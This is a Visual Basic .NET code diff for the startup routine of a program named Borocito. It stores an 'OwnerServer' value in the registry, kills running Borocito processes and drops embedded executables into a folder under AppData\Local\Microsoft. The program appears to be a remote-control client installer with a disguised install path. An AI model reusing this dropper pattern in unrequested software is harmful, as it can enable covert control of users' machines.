@@ -4,6 +4,8 @@ Module GlobalUses
     Public parameters As String
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
     Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
+
+    Public OverrideOwner As Boolean = False
 End Module
 Module Utility
     Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
@@ -120,16 +122,31 @@ Module StartUp
         Try
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             If regKey Is Nothing Then
-                AddToLog("CheckIfExist@StartUp", "Guardando valores en el registro...", False)
-                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
-                regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
-                regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
+                AddToLog("CheckIfExist@StartUp", "Escribiendo valores en el registro...", False)
+                SetExistence()
             Else
+                If regKey.GetValue("OwnerServer") = Nothing Then
+                    SetExistence()
+                End If
+                If OverrideOwner Then
+                    AddToLog("CheckIfExist@StartUp", "Sobreescribiendo valores en el registro...", False)
+                    regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
+                End If
                 AddToLog("CheckIfExist@StartUp", "Leyendo valores del registro...", False)
                 OwnerServer = regKey.GetValue("OwnerServer")
             End If
         Catch ex As Exception
             AddToLog("CheckIfExist@StartUp", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub SetExistence()
+        Try
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
+            Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
+            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
+            regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
+        Catch ex As Exception
+            AddToLog("SetExistence@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub StartExtract()
@@ -140,24 +157,41 @@ Module StartUp
                 If Borocito.Length >= 1 Then
                     Borocito(0).Kill()
                 End If
+            Catch ex As Exception
+                AddToLog("StartExtract(KillProc(0))@StartUp", "Error: " & ex.Message, True)
+            End Try
+            Try
                 Dim Updater As Process() = Process.GetProcessesByName("BorocitoUpdater")
                 If Updater.Length >= 1 Then
                     Updater(0).Kill()
                 End If
+            Catch ex As Exception
+                AddToLog("StartExtract)KillProc(1))@StartUp", "Error: " & ex.Message, True)
+            End Try
+            Try
                 Dim Updater2 As Process() = Process.GetProcessesByName("BoroUpdater")
                 If Updater2.Length >= 1 Then
                     Updater2(0).Kill()
                 End If
-            Catch
+            Catch ex As Exception
+                AddToLog("StartExtract(KillProc(2))@StartUp", "Error: " & ex.Message, True)
             End Try
-            If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
-                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
-            End If
-            My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\Borocito.exe", My.Resources.Borocito, False)
-            If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoUpdater.exe") Then
-                My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoUpdater.exe")
-            End If
-            My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\BorocitoUpdater.exe", My.Resources.BorocitoUpdater, False)
+            Try
+                If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
+                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
+                End If
+                My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\Borocito.exe", My.Resources.Borocito, False)
+            Catch ex As Exception
+                AddToLog("StartExtract(CopyTo(0))@StartUp", "Error: " & ex.Message, True)
+            End Try
+            Try
+                If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoUpdater.exe") Then
+                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoUpdater.exe")
+                End If
+                My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\BorocitoUpdater.exe", My.Resources.BorocitoUpdater, False)
+            Catch ex As Exception
+                AddToLog("StartExtract(CopyTo(1))@StartUp", "Error: " & ex.Message, True)
+            End Try
         Catch ex As Exception
             AddToLog("StartExtract@StartUp", "Error: " & ex.Message, True)
         End Try
